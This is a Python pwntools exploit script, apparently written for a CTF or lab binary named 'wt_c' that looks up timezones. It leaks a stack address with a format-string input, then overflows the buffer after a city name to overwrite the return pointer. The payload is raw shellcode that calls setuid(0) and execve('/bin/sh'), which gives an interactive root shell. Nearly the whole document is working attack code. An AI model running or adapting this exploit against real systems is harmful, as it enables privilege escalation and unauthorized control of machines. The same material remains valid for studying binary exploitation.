#!/usr/bin/python3

# Dependency: pwnlib
from pwn import *

sh = process('./wt_c')
sh.recvline(b'Please enter a timezone. Press CTRL-C to exit:')

# Leak the stack address
sh.sendline('%p %p %p %p %p %p %p %p')
sh.recvuntil(b'Getting results for: ')
a = int(sh.recvline().decode("utf-8").strip().split()[-1], 0)
print(f"Leaked stack address {hex(a)}")
buf = a - 0x190
print(f"The buffer should be at {hex(buf)}")

# Add the exploit payload

# This payload calls setuid(0)
payload = b"\x6a\x17\x58\x31\xdb\xcd\x80"

# This payload calls execve("/bin/sh")
payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# This is the city we will use in our exploit
city_to_pwn = b"America/Los_Angeles"

# Calculate where to put our payload
payload_start = buf + len(city_to_pwn)

# Create an overrun that overwrites RIP with the stack address
overrun = payload + b"A"*(101 - len(payload))

# Append the RIP pointer to the payload
overrun += p64(payload_start)

# Send to the client
sh.sendline(city_to_pwn + overrun)

# Interact with the shell
sh.interactive()
